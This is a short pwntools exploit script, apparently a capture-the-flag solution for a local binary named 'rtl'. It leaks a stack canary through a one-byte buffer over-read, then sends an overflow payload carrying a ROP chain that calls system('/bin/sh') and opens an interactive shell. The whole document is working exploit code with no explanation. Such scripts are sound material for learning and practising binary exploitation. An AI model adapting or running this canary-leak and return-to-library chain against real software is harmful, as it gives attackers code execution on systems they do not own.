from pwn import *

p = process('./rtl')
e = ELF('rtl')
r = ROP('./rtl')

pop_rdi = r.rdi.address
ret = r.ret.address
binsh = next(e.search(b'/bin/sh'))
system_plt = e.symbols['system']
print(hex(binsh))


buf = b"A"*0x39
p.sendafter(b"Buf: ", buf)
p.recvuntil(buf)
canary = u64(b'\x00' + p.recv(7))
print(hex(canary))

payload = b"A"*0x38 + p64(canary) + b"A"*0x8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)
p.sendlineafter(b"Buf: ", payload)


p.interactive()

